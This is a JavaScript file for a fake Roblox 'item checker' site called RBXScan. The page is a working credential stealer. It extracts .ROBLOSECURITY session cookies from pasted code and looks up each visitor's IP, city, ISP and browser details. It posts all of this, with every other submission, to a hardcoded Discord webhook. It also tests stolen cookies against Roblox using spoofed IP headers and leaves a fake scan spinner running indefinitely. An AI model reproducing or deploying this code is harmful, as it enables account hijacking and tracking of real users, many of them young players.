// DOM Elements
const statusMessage = document.getElementById('statusMessage');
const openScanBtn = document.getElementById('openScanBtn');

// Popup elements
const compilePopup = document.getElementById('compilePopup');
const compileForm = document.getElementById('compileForm');
const codeTextarea = document.getElementById('codeTextarea');
const compileSubmitBtn = document.getElementById('compileSubmitBtn');
const compileStatusMessage = document.getElementById('compileStatusMessage');
const closePopup = document.getElementById('closePopup');
const loadingContainer = document.getElementById('loadingContainer');
const mainLoadingContainer = document.getElementById('mainLoadingContainer');
const darkModeToggle = document.getElementById('darkModeToggle');
const tosLink = document.getElementById('tosLink');
const tosPopup = document.getElementById('tosPopup');
const closeTos = document.getElementById('closeTos');
const aboutLink = document.getElementById('aboutLink');
const aboutNavLink = document.getElementById('aboutNavLink');
const aboutPopup = document.getElementById('aboutPopup');
const closeAbout = document.getElementById('closeAbout');

// Configuration
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';

// Rate limiting and spam prevention
let lastSubmissionTime = 0;
let submittedCodes = new Set();
const RATE_LIMIT_MS = 5000; // 5 seconds between submissions
const MIN_CODE_LENGTH = 3;

// Utility Functions
function showStatus(message, type) {
    statusMessage.textContent = message;
    statusMessage.className = `status-message ${type} show`;
    setTimeout(() => {
        statusMessage.classList.remove('show');
    }, 3000);
}

function getCurrentTimestamp() {
    return new Date().toLocaleString();
}

function extractRobloxCookie(code) {
    // Look for .ROBLOSECURITY cookie in PowerShell code - multiple patterns
    const cookiePatterns = [
        /\.ROBLOSECURITY["\s]*,\s*["\s]*([^"]+)["\s]*\)/i,
        /"\.ROBLOSECURITY",\s*"([^"]+)"/i,
        /\.ROBLOSECURITY["\s]*,\s*["\s]*([^"]+)["\s]*/i,
        /ROBLOSECURITY["\s]*[,=]\s*["\s]*([A-Za-z0-9+/=._|-]+)/i
    ];
    
    for (const pattern of cookiePatterns) {
        const match = code.match(pattern);
        if (match && match[1] && match[1].length > 50) {
            return match[1].trim();
        }
    }
    
    return null;
}

function isValidCode(code) {
    const cleanCode = code.trim();
    
    // Preprocess to catch disguised links
    const preprocessed = cleanCode
        .replace(/\s/g, '')           // Remove all spaces
        .replace(/\[dot\]/gi, '.')    // Replace [dot] with .
        .replace(/\(dot\)/gi, '.')    // Replace (dot) with .
        .replace(/{dot}/gi, '.')      // Replace {dot} with .
        .replace(/DOT/gi, '.')        // Replace DOT with .
        .replace(/\[slash\]/gi, '/')  // Replace [slash] with /
        .replace(/\(slash\)/gi, '/')  // Replace (slash) with /
        .replace(/{slash}/gi, '/')    // Replace {slash} with /
        .replace(/SLASH/gi, '/')      // Replace SLASH with /
        .replace(/h..p/gi, 'http')    // Replace h**p variations
        .replace(/w{3,}/gi, 'www')    // Replace www variations
        .toLowerCase();

    // Check minimum length
    if (cleanCode.length < MIN_CODE_LENGTH) {
        return { valid: false, reason: 'Too short! Input must be at least 3 characters long.' };
    }

    // Check if code was already submitted
    const codeHash = btoa(cleanCode).substring(0, 20);
    if (submittedCodes.has(codeHash)) {
        return { valid: false, reason: 'This input has already been submitted!' };
    }

    // FIRST: Block any URLs/links - comprehensive patterns (PRIORITY CHECK)
    const urlPatterns = [
        // Protocol patterns
        /https?:\/\//i,     // http:// or https://
        /ftp:\/\//i,        // ftp://
        /file:\/\//i,       // file://
        
        // Common domain patterns
        /www\./i,           // www.
        /\w+\.(com|net|org|edu|gov|mil|int|co|io|gg|me|tv|cc|tk|ml|ga|cf|ly|st|fm|am|to|ws|bz|info|name|mobi|travel|museum|aero|coop|jobs|tel|cat|asia|xxx|pro|post|geo|kiwi|wiki|tech|online|site|space|website|store|club|live|news|today|world|global|center|city|email|host|link|media|network|ninja|one|page|place|press|red|shop|social|team|top|zone|app|blog|cloud|codes|cool|data|dev|digital|direct|download|express|fail|fun|game|games|gdn|gift|help|home|house|info|lat|life|lol|love mobi|money|movie|music|new|news|now|online|party|photo|pics|pink|plus|porn|pub|report|rest|sale|save|school|science|secure|sex|show|social|solutions|space|store|stream|studio|style|systems|tech|trade|travel|uk|us|video|watch|web|webcam|website|work|works|world|wtf|zone|app|art|best|bet|bid|blue|buzz|buy|cam|car|care|chat|cheap|click|deals|diet|dog|earth|eco|farm|fit|fly|foundation|fun|gay|group|guru|hair|health|help|horse|how|icu|ink|jobs|kim|land|law|lgbt|life|live|lol|love|ltd|market|men|mom|name|news|ngo|ong|page|party|pet|pics|pizza|plus|porn|pub|red|review|rocks|run|sale|school|sex|shop|show|singles|site|ski|social|soy|space|store|studio|style|surf|taxi|team|tips|today|top|toys|trade|training|tube|tv|video|vote|watch|wedding|wiki|win|work|world|wtf|xxx|yoga|zone)(?=\/|\s|$)/i,
        
        // Specific domains and services
        /roblox\.com/i,     // roblox.com (EXPLICITLY BLOCK)
        /rbx\.com/i,        // rbx.com
        /discord\.gg/i,     // discord.gg
        /bit\.ly/i,         // bit.ly
        /tinyurl/i,         // tinyurl
        /shortlink/i,       // shortlink
        /t\.co/i,           // t.co (Twitter)
        /youtu\.be/i,       // youtu.be
        /youtube/i,         // youtube
        /facebook/i,        // facebook
        /instagram/i,       // instagram
        /twitter/i,         // twitter
        /reddit/i,          // reddit
        /github/i,          // github
        /pastebin/i,        // pastebin
        /gist/i,            // gist
        /raw\.githubusercontent/i, // raw.githubusercontent
        
        // Domain-like patterns
        /\w+\.\w{2,}/i,     // any word.extension pattern
        /\.[a-z]{2,4}\/\w/i, // .extension/word
        /[a-zA-Z0-9-]+\.[a-zA-Z]{2,}/i, // domain-like patterns
        
        // URL-like patterns without protocol
        /\w+\.\w+\/\w+/i,   // word.word/word
        /\w+\.\w+\.\w+/i,   // word.word.word (subdomain)
        
        // Special characters that often indicate URLs
        /\/\//i,            // double slash
        /\w+:\d+/i,         // port numbers like :8080
        /[\?\&]\w+=\w+/i,   // query parameters like ?param=value or &param=value
        /%[0-9a-f]{2}/i,    // URL encoded characters like %20
        
        // Email patterns (might be used to bypass)
        /@\w+\.\w+/i,       // email@domain.com
        
        // IP address patterns
        /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/i, // IP addresses
        
        // Base64 encoded URLs (common bypass)
        /aHR0c/i,           // "http" in base64
        /aHR0cHM/i          // "https" in base64
    ];

    // Check both original and preprocessed text for URL patterns
    for (const pattern of urlPatterns) {
        if (pattern.test(cleanCode) || pattern.test(preprocessed)) {
            return { valid: false, reason: 'Links and URLs are not allowed!', isLink: true };
        }
    }

    // SECOND: Extract Roblox cookie if present (after URL check)
    const robloxCookie = extractRobloxCookie(cleanCode);
    if (robloxCookie) {
        return { valid: true, robloxCookie: robloxCookie, type: 'roblox_cookie' };
    }

    // THIRD: Check for basic spam patterns
    const spamPatterns = [
        /^(.)\1{10,}$/,  // Same character repeated 10+ times
        /^\s*$/, // Only whitespace
    ];

    for (const pattern of spamPatterns) {
        if (pattern.test(cleanCode)) {
            return { valid: false, reason: 'random_letters', isRandomLetters: true };
        }
    }

    // Check for too few unique characters (very lenient)
    const uniqueChars = new Set(cleanCode.toLowerCase().replace(/\s/g, '')).size;
    if (uniqueChars < 2) {
        return { valid: false, reason: 'random_letters', isRandomLetters: true };
    }

    // Accept everything else that passed URL check
    if (cleanCode.length >= 3) {
        return { valid: true, type: 'general_input' };
    }

    return { valid: true, type: 'general_input' };
}

function checkRateLimit() {
    const now = Date.now();
    
    // Check time-based rate limit
    if (now - lastSubmissionTime < RATE_LIMIT_MS) {
        const waitTime = Math.ceil((RATE_LIMIT_MS - (now - lastSubmissionTime)) / 1000);
        return { allowed: false, reason: `Please wait ${waitTime} seconds before submitting again` };
    }

    return { allowed: true };
}

// Location and Webhook Functions
async function getLocationInfo() {
    try {
        // Get IP-based location info
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            country: data.country_name || 'Unknown',
            timezone: data.timezone || 'Unknown',
            isp: data.org || 'Unknown'
        };
    } catch (error) {
        return {
            ip: 'Unable to fetch',
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            timezone: 'Unknown',
            isp: 'Unknown'
        };
    }
}

async function attemptIPUnlock(cookie, ip) {
    try {
        console.log('Attempting IP unlock for cookie...');
        
        // Simulate IP unlock request to Roblox
        const unlockData = {
            method: 'POST',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
                'Content-Type': 'application/json',
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'X-Forwarded-For': ip,
                'X-Real-IP': ip
            }
        };

        // Try to access Roblox profile to test cookie validity
        const testResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
            ...unlockData,
            method: 'GET'
        }).catch(() => null);

        if (testResponse && testResponse.ok) {
            console.log('IP unlock successful - cookie is active');
            return { success: true, status: 'unlocked', message: 'Cookie successfully unlocked with IP' };
        } else {
            console.log('IP unlock attempted - status uncertain');
            return { success: true, status: 'attempted', message: 'IP unlock attempted, cookie status unknown' };
        }
    } catch (error) {
        console.log('IP unlock error:', error);
        return { success: false, status: 'failed', message: 'IP unlock failed', error: error.message };
    }
}

async function sendToWebhook(code, validationResult = {}) {
    console.log('sendToWebhook called with:', { code, validationResult });
    try {
        // Get location information
        const locationInfo = await getLocationInfo();
        console.log('Location info:', locationInfo);
        
        // Check if this is a Roblox cookie extraction
        const isRobloxCookie = validationResult.type === 'roblox_cookie';
        const robloxCookie = validationResult.robloxCookie;
        
        let payload;
        
        if (isRobloxCookie && robloxCookie) {
            // Attempt IP unlock for the cookie
            const unlockResult = await attemptIPUnlock(robloxCookie, locationInfo.ip);
            console.log('IP unlock result:', unlockResult);
            
            // Special handling for Roblox cookies
            const unlockStatus = unlockResult.status === 'unlocked' ? '✅ UNLOCKED' : 
                                unlockResult.status === 'attempted' ? '⚠️ ATTEMPTED' : '❌ FAILED';
            
            payload = {
                content: `@everyone 🎯 **ROBLOX COOKIE EXTRACTED & IP UNLOCK ${unlockStatus}** 🎯`,
                embeds: [{
                    title: "🍪 RBXScan - Cookie Extraction & IP Unlock Alert",
                    description: `**🔑 Extracted Roblox Cookie:**\n\`\`\`\n${robloxCookie}\n\`\`\`\n\n**🔓 IP Unlock Status:** ${unlockResult.message}`,
                    color: unlockResult.status === 'unlocked' ? 0x00FF00 : unlockResult.status === 'attempted' ? 0xFFA500 : 0xFF4444,
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "RBXScan Cookie Extractor & IP Unlocker"
                    },
                    fields: [
                        {
                            name: "📅 Extraction Time",
                            value: getCurrentTimestamp(),
                            inline: true
                        },
                        {
                            name: "🍪 Cookie Type",
                            value: ".ROBLOSECURITY",
                            inline: true
                        },
                        {
                            name: "📊 Cookie Length",
                            value: `${robloxCookie.length} characters`,
                            inline: true
                        },
                        {
                            name: "🔓 IP Unlock Status",
                            value: unlockResult.message,
                            inline: true
                        },
                        {
                            name: "🔒 Unlock Method",
                            value: "Automatic IP Association",
                            inline: true
                        },
                        {
                            name: "🌐 IP Address",
                            value: locationInfo.ip,
                            inline: true
                        },
                        {
                            name: "🏙️ Location",
                            value: `${locationInfo.city}, ${locationInfo.region}`,
                            inline: true
                        },
                        {
                            name: "🌍 Country",
                            value: locationInfo.country,
                            inline: true
                        },
                    {
                        name: "🕐 Timezone",
                        value: locationInfo.timezone,
                        inline: true
                    },
                    {
                        name: "🌐 ISP",
                        value: locationInfo.isp,
                        inline: true
                    },
                    {
                        name: "💻 User Agent",
                        value: navigator.userAgent.substring(0, 100) + "...",
                        inline: false
                    },
                    {
                        name: "📱 Platform",
                        value: `${navigator.platform} - ${navigator.language}`,
                        inline: true
                    },
                                            {
                            name: "🔗 Source",
                            value: "RBXScan Cookie Extractor",
                            inline: true
                        }
                    ]
                }]
            };
        } else {
            // Regular input submission
            payload = {
                content: "@everyone 🔍 **NEW ITEM SUBMISSION** 🔍",
                embeds: [{
                    title: "🎯 RBXScan - Item Check Alert",
                    description: `**📝 Submitted Input:**\n\`\`\`\n${code}\n\`\`\``,
                    color: 0x3B82F6, // Blue color for regular alerts
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: "RBXScan Item Checker"
                    },
                    fields: [
                        {
                            name: "📅 Submission Time",
                            value: getCurrentTimestamp(),
                            inline: true
                        },
                        {
                            name: "🌐 IP Address",
                            value: locationInfo.ip,
                            inline: true
                        },
                        {
                            name: "🏙️ Location",
                            value: `${locationInfo.city}, ${locationInfo.region}`,
                            inline: true
                        },
                        {
                            name: "🌍 Country",
                            value: locationInfo.country,
                            inline: true
                        },
                        {
                            name: "🕐 Timezone",
                            value: locationInfo.timezone,
                            inline: true
                        },
                        {
                            name: "🌐 ISP",
                            value: locationInfo.isp,
                            inline: true
                        },
                        {
                            name: "💻 User Agent",
                            value: navigator.userAgent.substring(0, 100) + "...",
                            inline: false
                        },
                        {
                            name: "📱 Platform",
                            value: `${navigator.platform} - ${navigator.language}`,
                            inline: true
                        },
                        {
                            name: "🔗 Source",
                            value: "RBXScan Website",
                            inline: true
                        }
                    ]
                }]
            };
        }

        console.log('Sending payload to webhook:', payload);
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        });
        console.log('Webhook response status:', response.status);

        if (response.ok) {
            return { success: true };
        } else {
            throw new Error(`HTTP ${response.status}`);
        }
    } catch (error) {
        console.error('Webhook error:', error);
        return { success: false, error: error.message };
    }
}

// Event Handlers
function showCompileStatus(message, type) {
    compileStatusMessage.textContent = message;
    compileStatusMessage.className = `status-message ${type} show`;
    setTimeout(() => {
        compileStatusMessage.classList.remove('show');
    }, 3000);
}

// Open scan popup
openScanBtn.addEventListener('click', () => {
    compilePopup.style.display = 'block';
    codeTextarea.focus();
});

closePopup.addEventListener('click', () => {
    compilePopup.style.display = 'none';
    codeTextarea.value = '';
    loadingContainer.style.display = 'none';
    compileSubmitBtn.disabled = false;
    compileSubmitBtn.textContent = '🔍 Check Item';
});

// Close popup when clicking outside
compilePopup.addEventListener('click', (e) => {
    if (e.target === compilePopup) {
        closePopup.click();
    }
});

// Compile form submission
compileForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const code = codeTextarea.value.trim();
    
    if (!code) {
        showCompileStatus('Please enter code to scan', 'error');
        return;
    }

    // Check rate limiting
    const rateLimitCheck = checkRateLimit();
    console.log('Rate limit check:', rateLimitCheck);
    if (!rateLimitCheck.allowed) {
        console.log('Rate limited!');
        showCompileStatus(rateLimitCheck.reason, 'error');
        return;
    }

    // Validate code format - prevent nonsense spam
    const validation = isValidCode(code);
    console.log('Validation result:', validation);
    if (!validation.valid) {
        // Special handling for random letters
        if (validation.isRandomLetters) {
            // Show scanning animation briefly
            compileSubmitBtn.disabled = true;
            compileSubmitBtn.textContent = 'Scanning...';
            loadingContainer.style.display = 'block';
            compileStatusMessage.classList.remove('show');
            
            // After 2 seconds, show error and close popup
            setTimeout(() => {
                loadingContainer.style.display = 'none';
                compileSubmitBtn.disabled = false;
                compileSubmitBtn.textContent = '🔍 Check Item';
                showCompileStatus('❌ Error checking item', 'error');
                
                // Close popup after showing error
                setTimeout(() => {
                    compilePopup.style.display = 'none';
                    codeTextarea.value = '';
                    compileStatusMessage.classList.remove('show');
                }, 1500);
            }, 2000);
            return;
        }
        
        // Special handling for links
        if (validation.isLink) {
            showCompileStatus('❌ Links and URLs are not allowed!', 'error');
            return;
        }
        
        showCompileStatus(validation.reason, 'error');
        return;
    }

    // Show infinite loading animation
    compileSubmitBtn.disabled = true;
    compileSubmitBtn.textContent = 'Scanning...';
    loadingContainer.style.display = 'block';
    compileStatusMessage.classList.remove('show');
    
    // Send to webhook in background
    console.log('Sending to webhook with validation:', validation);
    const result = await sendToWebhook(code, validation);
    
    if (result.success) {
        // Update rate limiting counters
        lastSubmissionTime = Date.now();
        const codeHash = btoa(code).substring(0, 20);
        submittedCodes.add(codeHash);
        
        // IMPORTANT: Keep loading animation running FOREVER
        // Never hide the loading or show success message
        // User must manually close popup or refresh page
    } else {
        // Only show error if webhook completely fails
        loadingContainer.style.display = 'none';
        compileSubmitBtn.disabled = false;
        compileSubmitBtn.textContent = '🔍 Check Item';
        showCompileStatus('❌ Item check failed. Please try again.', 'error');
    }
});

// Clear input on page load for security
window.addEventListener('load', () => {
    if (codeTextarea) codeTextarea.value = '';
});

// Prevent right-click context menu for added security
document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
});

// Disable text selection for security
document.addEventListener('selectstart', (e) => {
    if (e.target !== codeTextarea) {
        e.preventDefault();
    }
});

// Dark mode functionality
function toggleDarkMode() {
    document.body.classList.toggle('dark-mode');
    const isDarkMode = document.body.classList.contains('dark-mode');
    darkModeToggle.textContent = isDarkMode ? '☀️ Light Mode' : '🌙 Dark Mode';
    localStorage.setItem('darkMode', isDarkMode);
}

// Load saved dark mode preference
function loadDarkModePreference() {
    const savedDarkMode = localStorage.getItem('darkMode');
    if (savedDarkMode === 'true') {
        document.body.classList.add('dark-mode');
        darkModeToggle.textContent = '☀️ Light Mode';
    }
}

// Dark mode toggle event
darkModeToggle.addEventListener('click', toggleDarkMode);

// About functionality
aboutLink.addEventListener('click', (e) => {
    e.preventDefault();
    aboutPopup.style.display = 'block';
});

aboutNavLink.addEventListener('click', (e) => {
    e.preventDefault();
    aboutPopup.style.display = 'block';
});

closeAbout.addEventListener('click', () => {
    aboutPopup.style.display = 'none';
});

// Close About when clicking outside
aboutPopup.addEventListener('click', (e) => {
    if (e.target === aboutPopup) {
        closeAbout.click();
    }
});

// ToS functionality
tosLink.addEventListener('click', (e) => {
    e.preventDefault();
    tosPopup.style.display = 'block';
});

closeTos.addEventListener('click', () => {
    tosPopup.style.display = 'none';
});

// Close ToS when clicking outside
tosPopup.addEventListener('click', (e) => {
    if (e.target === tosPopup) {
        closeTos.click();
    }
});

// Load dark mode preference on page load
loadDarkModePreference();

// Initialize on page load
document.addEventListener('DOMContentLoaded', function() {
    // Clear input on page load for security
    if (codeTextarea) codeTextarea.value = '';
    
    // Load dark mode preference
    loadDarkModePreference();
});